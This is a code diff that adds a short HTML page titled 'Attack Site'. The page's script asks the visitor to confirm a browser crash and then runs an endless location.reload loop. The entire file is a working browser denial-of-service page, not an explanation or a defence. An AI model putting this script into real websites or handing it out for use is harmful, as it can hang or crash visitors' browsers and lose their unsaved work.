@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+
+<title>Attack Site</title>
+
+<body>
+
+
+    <h2>Crashing Now</h2>
+
+    <p id="demo"></p>
+
+
+    <script>
+        onbeforeunload = function () { localStorage.x = 1 };
+
+
+        if (confirm("This will crash your browser!")) {
+            setTimeout(function () {
+                while (1) location.reload(1)
+            }, 1000)
+        }
+    </script>
+
+
+</body>
+
+</html>
